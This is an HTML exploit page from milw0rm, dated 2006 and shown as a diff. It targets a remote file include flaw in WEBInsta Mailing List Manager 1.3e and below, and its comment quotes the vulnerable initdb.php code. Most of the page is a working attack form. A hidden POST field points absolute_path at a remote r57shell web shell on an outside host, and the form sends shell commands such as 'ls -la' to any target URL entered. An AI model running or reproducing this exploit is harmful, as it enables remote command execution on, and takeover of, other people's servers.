@@ -1,0 +1,67 @@
+<!--
+vulnerable code: /maillist/inc/initdb.php
+-----------------------------------------------------------------------
+if(isset($_GET['absolute_path']))
+ {
+echo "no access from here !!";
+exit;
+}
+
+include($absolute_path.'inc/adodbt/db.inc');
+-----------------------------------------------------------------------
+The above snippet does not stop post requests to the absolute_path variable.
+
+A r57shell with a twist.
+
+o---[ r57shell - http-shell by RST/GHC | http://rst.void.ru | http://ghc.ru | version 1.31 ]---o
+
+/str0ke ! milw0rm.com
+-->
+
+<head>
+<title>WEBInsta Mailing List Manager &lt;= 1.3e (initdb.php) Remote File Include Exploit</title>
+</head>
+<script language="JavaScript">
+function milw0rm() {
+  if (document.exploit.target.value=="") {
+    alert("Enter a Target");
+    return false;
+  }
+
+  exploit.action= document.exploit.target.value;
+  exploit.cmd.value=document.exploit.cmd.value;
+  exploit.dir.value=document.exploit.dir.value;
+  exploit.submit();
+}
+</script>
+<body>
+<form name="exploit" target="exploitframe" method="post" onSubmit="milw0rm();">
+  <table width="975" border="0">
+    <tr>
+      <td width="961" align="left" valign="top" nowrap="nowrap"><strong>WEBInsta Mailing List Manager &lt;= 1.3e (initdb.php) Remote File Include Exploit</strong></td>
+
+    </tr>
+    <tr>
+      <td><em>
+        <input type="hidden" name="absolute_path" value="http://rst.void.ru/download/r57shell.txt?&" />
+        </em><strong>*</strong><em>target</em>
+        <input name="target" type="text" value="http://www.site.com/maillist/inc/initdb.php" size="50" maxlength="150" />
+        <strong> *</strong><em>cmd</em>
+
+        <input name="cmd" type="text" value="ls -la">
+        <strong>*</strong><em>dir</em>
+        <input name="dir" type="text" value=".">
+        <em>
+        <input type="submit" name="Submit" value="Exploit" />
+        </em></td>
+    </tr>
+  </table>
+
+  <p>
+    <iframe name="exploitframe" height="410" width="1100" scrolling="yes" frameborder="0"></iframe>
+  </p>
+</form>
+</body>
+</html>
+
+# milw0rm.com [2006-08-15]
